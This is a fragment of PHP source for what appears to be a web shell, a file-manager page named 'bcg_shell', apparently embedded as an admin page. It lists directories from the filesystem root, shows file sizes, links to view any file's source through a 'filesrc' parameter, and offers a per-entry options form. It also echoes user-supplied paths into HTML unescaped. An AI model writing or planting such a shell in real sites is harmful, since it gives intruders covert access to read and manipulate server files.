...
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?page=bcg_shell&path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?page=bcg_shell&path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
...
echo "<tr>
<td><a href=\"?page=bcg_shell&path=$path/$dir\">$dir</a></td>
<td><center>--</center></td>
<td><center>";
...
echo "</center></td>
<td><center><form method=\"POST\" action=\"?page=bcg_shell&option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
...
echo "<tr>
<td><a href=\"?page=bcg_shell&filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
